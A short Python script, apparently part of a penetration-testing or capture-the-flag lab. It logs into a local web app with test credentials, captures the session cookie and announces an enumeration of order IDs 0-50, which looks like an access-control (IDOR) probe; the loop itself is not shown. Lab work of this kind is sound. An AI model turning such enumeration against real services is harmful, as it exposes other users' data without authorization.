import requests
import re

# Configuration
base_url = "http://127.0.0.1:32941"
auth_username = "test"
auth_password = "test"
user_id = "10032"

# Step 1: First authentication step
print("[*] Step 1: POST username to /")
step1_response = requests.post(
    f"{base_url}/",
    data={"username": auth_username},
    allow_redirects=False
)
print(f"[+] Step 1 Response: Status={step1_response.status_code}")

# Step 2: Second authentication step
print("\n[*] Step 2: POST username, user_id, password to /password/test")
step2_response = requests.post(
    f"{base_url}/password/test",
    data={
        "username": auth_username,
        "user_id": user_id,
        "password": auth_password
    },
    allow_redirects=False
)
print(f"[+] Step 2 Response: Status={step2_response.status_code}")

# Extract session cookie
session_cookie = None
if 'Set-Cookie' in step2_response.headers:
    cookie_header = step2_response.headers['Set-Cookie']
    if 'session=' in cookie_header:
        session_value = cookie_header.split('session=')[1].split(';')[0]
        session_cookie = f"session={session_value}"
        print(f"[+] Extracted Session Cookie: {session_cookie}")

if not session_cookie:
    print("[!] Authentication failed - could not obtain session cookie")
    exit(1)

# Now enumerate order IDs and get FULL responses
print(f"\n[*] Starting enumeration of order_id values 0-50 (getting full responses)")
